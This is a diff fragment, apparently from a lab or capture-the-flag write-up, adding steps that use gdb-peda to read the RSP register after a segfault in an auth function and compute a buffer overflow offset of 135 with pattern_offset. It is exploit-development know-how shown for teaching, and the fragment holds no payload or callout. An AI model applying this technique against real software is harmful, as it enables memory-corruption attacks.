@@ -372,4 +372,13 @@ Legend: code, data, rodata, value
 Stopped reason: SIGSEGV
 0x0000000000401618 in auth ()
 ```
-Third
+Third, we need to grab the memory address of the <b>RSP</b>
+```
+gdb-peda$ x/xg $rsp
+0x7fffffffe128: 0x416d41415141416c
+```
+Lastly, use <b>pattern_offset</b> in combination with the <b>RSP</b> memory address to get the offset. Doing this shows us the offset is 135
+```
+gdb-peda$ pattern_offset 0x416d41415141416c
+4714496133718688108 found at offset: 135
+```
